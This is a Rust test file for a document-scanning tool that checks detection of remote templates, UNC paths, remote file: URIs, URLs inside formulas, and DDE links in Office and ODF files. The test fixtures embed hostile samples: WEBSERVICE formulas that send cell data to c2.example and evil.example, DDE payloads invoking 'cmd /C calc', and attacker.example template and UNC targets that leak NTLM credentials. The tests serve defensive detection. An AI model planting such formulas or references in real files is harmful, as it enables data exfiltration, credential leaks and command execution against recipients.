//! Regression tests for how external references are discovered and classified:
//! relationship targets that bypass `TargetMode="External"`, URLs hidden in
//! formulas, and `file:` forms that reach a remote host.

use super::fixtures::*;
use crate::report::{RefKind, TargetClass, ThreatKind, Verdict, XRayReport};
use crate::scan_default;

fn template_doc(target: &str, external: bool) -> Vec<u8> {
    let mut o = docx();
    o.set("word/_rels/settings.xml.rels", rels(&[("rId1", "attachedTemplate", target, external)]))
        .set(
            "word/settings.xml",
            format!(
                r#"<w:settings xmlns:w="{W_NS}" xmlns:r="{R_NS}"><w:attachedTemplate r:id="rId1"/></w:settings>"#
            ),
        );
    o.build()
}

fn assert_remote_template(r: &XRayReport, class: TargetClass) {
    assert!(r.has(ThreatKind::RemoteTemplate), "{:#?}", r.findings);
    assert_eq!(r.verdict, Verdict::ActiveContentNeutralized);
    assert!(
        r.external_refs.iter().any(|e| e.kind == RefKind::Template && e.class == class),
        "{:#?}",
        r.external_refs
    );
}

// ---- F-4: the target decides, not TargetMode -------------------------------

#[test]
fn f4_network_path_target_without_target_mode_is_remote() {
    let r = scan_default(&template_doc("//attacker.example/share/t.dotm", false));
    assert_remote_template(&r, TargetClass::Unc);
    assert!(r.has(ThreatKind::UncPathReference));
}

#[test]
fn f4_unc_target_without_target_mode_is_remote() {
    let r = scan_default(&template_doc(r"\\attacker.example\share\t.dotm", false));
    assert_remote_template(&r, TargetClass::Unc);
}

#[test]
fn f4_scheme_target_without_target_mode_is_remote() {
    let r = scan_default(&template_doc("https://attacker.example/t.dotm", false));
    assert_remote_template(&r, TargetClass::Web);
}

#[test]
fn f4_drive_path_without_target_mode_is_a_local_path_leak() {
    let r = scan_default(&template_doc(r"C:\Users\ivan\AppData\Normal.dotm", false));
    assert!(r.has(ThreatKind::LocalPathLeak), "{:#?}", r.findings);
    assert!(!r.has(ThreatKind::RemoteTemplate), "a local template is not a network fetch");
}

#[test]
fn f4_ordinary_internal_targets_are_unaffected() {
    for target in ["settings.xml", "../word/styles.xml", "/word/styles.xml", "media/image1.png"] {
        let r = scan_default(&template_doc(target, false));
        assert!(!r.has(ThreatKind::RemoteTemplate), "{target}: {:#?}", r.findings);
        assert!(!r.has(ThreatKind::UncPathReference), "{target}");
    }
}

// ---- A-2 end to end: remote `file:` forms -----------------------------------

#[test]
fn a2_file_uri_forms_that_reach_a_host_are_remote_templates() {
    for target in [
        "file://attacker.example/share/t.dotm",
        "file:////attacker.example/share/t.dotm",
        r"file:///\\attacker.example\share\t.dotm",
        r"file://\\attacker.example\share\t.dotm",
        "FILE://ATTACKER.EXAMPLE/share/t.dotm",
    ] {
        let r = scan_default(&template_doc(target, true));
        assert_remote_template(&r, TargetClass::Unc);
        assert!(
            r.metadata.iter().any(|m| m.value.eq_ignore_ascii_case("attacker.example")),
            "{target}: host must be extracted: {:#?}",
            r.metadata
        );
    }
}

#[test]
fn a2_genuinely_local_file_uris_stay_local() {
    for target in ["file:///C:/Users/ivan/Normal.dotm", "file:///home/ivan/t.dotm", "file:/etc/t"] {
        let r = scan_default(&template_doc(target, true));
        assert!(!r.has(ThreatKind::RemoteTemplate), "{target}: {:#?}", r.findings);
        assert!(r.has(ThreatKind::LocalPathLeak), "{target}");
    }
}

// ---- F-3: URLs inside formulas reach the external-reference list ------------

fn sheet_with(formula: &str) -> XRayReport {
    let escaped = formula.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;");
    let sheet = format!(r#"<row r="1"><c r="A1"><f>{escaped}</f></c></row>"#);
    scan_default(&xlsx(&sheet).build())
}

fn has_ref(r: &XRayReport, kind: RefKind, target: &str) -> bool {
    r.external_refs.iter().any(|e| e.kind == kind && e.target == target)
}

#[test]
fn f3_image_url_is_listed_and_counts_as_a_tracker() {
    let r = sheet_with(r#"_xlfn.IMAGE("https://t.example/p.png")"#);
    assert!(has_ref(&r, RefKind::Image, "https://t.example/p.png"), "{:#?}", r.external_refs);
    assert!(r.external_refs.iter().any(|e| e.auto_load));
    assert!(r.has(ThreatKind::ExternalImage));
    assert!(r.has(ThreatKind::DangerousFormula));
}

#[test]
fn f3_webservice_url_prefix_is_listed() {
    let r = sheet_with(r#"_xlfn.WEBSERVICE("https://c2.example/beacon?d="&A2)"#);
    assert!(
        has_ref(&r, RefKind::DataConnection, "https://c2.example/beacon?d="),
        "{:#?}",
        r.external_refs
    );
    assert!(r.has(ThreatKind::ExternalDataConnection));
}

#[test]
fn f3_hyperlink_unc_target_is_an_ntlm_leak_finding() {
    let r = sheet_with(r#"HYPERLINK("\\attacker.example\share\x.xlsx","Open")"#);
    assert!(r.has(ThreatKind::UncPathReference), "{:#?}", r.findings);
    assert!(r.external_refs.iter().any(|e| e.class == TargetClass::Unc && !e.auto_load));
}

#[test]
fn f3_harmless_formulas_add_no_references() {
    for f in ["SUM(A1:A9)", r##"HYPERLINK("#Sheet2!A1","go")"##, r#"IF(A1,"yes","no")"#] {
        let r = sheet_with(f);
        assert!(r.external_refs.is_empty(), "{f}: {:#?}", r.external_refs);
    }
}

#[test]
fn f3_dde_is_found_after_an_earlier_harmless_pipe() {
    let r = sheet_with(r#"IF(1,1)|cmd|' /C calc'!A0"#);
    assert!(r.has(ThreatKind::DdeFormula), "{:#?}", r.findings);
}

#[test]
fn f3_csv_formula_urls_are_listed() {
    let csv = b"name,value\nalice,=WEBSERVICE(\"http://evil.example/x?\"&A1)\nbob,2\n";
    let r = scan_default(csv);
    assert!(
        r.external_refs.iter().any(|e| e.target == "http://evil.example/x?"),
        "{:#?}",
        r.external_refs
    );
}

// ---- hardening: control characters cannot disguise a target -----------------

#[test]
fn control_characters_do_not_disguise_a_remote_target() {
    // `&#9;` survives XML attribute-value normalisation (a literal tab does not).
    let r = scan_default(&template_doc("ht&#9;tps://attacker.example/t.dotm", true));
    assert_remote_template(&r, TargetClass::Web);
}

// ---- ODF spreadsheets: formulas, external documents and DDE links ------------

fn ods(content_body: &str) -> Vec<u8> {
    use arca_container::zip::writer::Compression::{Deflated, Stored};
    let mut z = arca_container::zip::writer::ZipWriter::new();
    z.add("mimetype", b"application/vnd.oasis.opendocument.spreadsheet", Stored).unwrap();
    z.add(
        "META-INF/manifest.xml",
        br#"<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.spreadsheet"/></manifest:manifest>"#,
        Deflated,
    )
    .unwrap();
    let content = format!(
        r#"<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:xlink="http://www.w3.org/1999/xlink"><office:body><office:spreadsheet><table:table table:name="S">{content_body}</table:table></office:spreadsheet></office:body></office:document-content>"#
    );
    z.add("content.xml", content.as_bytes(), Deflated).unwrap();
    z.finish().unwrap()
}

#[test]
fn f3_ods_webservice_formula_url_is_listed() {
    let body = r#"<table:table-row><table:table-cell table:formula="of:=COM.MICROSOFT.WEBSERVICE(&quot;https://c2.example/b?d=&quot;&amp;[.A2])"/></table:table-row>"#;
    let r = scan_default(&ods(body));
    assert!(r.has(ThreatKind::DangerousFormula), "{:#?}", r.findings);
    assert!(
        has_ref(&r, RefKind::DataConnection, "https://c2.example/b?d="),
        "{:#?}",
        r.external_refs
    );
    assert_eq!(r.verdict, Verdict::ActiveContentNeutralized);
}

#[test]
fn f3_ods_dde_function_and_dde_link_are_findings() {
    let body = r#"<table:table-row><table:table-cell table:formula="of:=DDE(&quot;soffice&quot;;&quot;/tmp/x&quot;;&quot;A1&quot;)"/></table:table-row><table:table-row><table:table-cell><table:dde-link><table:dde-source office:dde-application="cmd" office:dde-topic="/c calc" office:dde-item="x"/></table:dde-link></table:table-cell></table:table-row>"#;
    let r = scan_default(&ods(body));
    assert!(r.of_kind(ThreatKind::DdeFormula).count() >= 2, "{:#?}", r.findings);
    assert!(r.of_kind(ThreatKind::DdeFormula).any(|f| f.detail.contains("cmd")));
}

#[test]
fn f3_ods_external_document_reference_is_listed() {
    let body = r##"<table:table-row><table:table-cell table:formula="of:=['file:///\\attacker.example\share\book.ods'#$Sheet1.A1]"/></table:table-row>"##;
    let r = scan_default(&ods(body));
    assert!(
        r.external_refs
            .iter()
            .any(|e| e.kind == RefKind::WorkbookLink && e.class == TargetClass::Unc),
        "{:#?}",
        r.external_refs
    );
    assert!(r.has(ThreatKind::UncPathReference));
}

#[test]
fn f3_ods_plain_formulas_stay_clean() {
    let body = r#"<table:table-row><table:table-cell table:formula="of:=SUM([.A1:.A9])"/><table:table-cell table:formula="of:=[.B1]*2"/></table:table-row>"#;
    let r = scan_default(&ods(body));
    assert_eq!(r.verdict, Verdict::Clean, "{:#?}", r.findings);
    assert!(r.external_refs.is_empty());
}
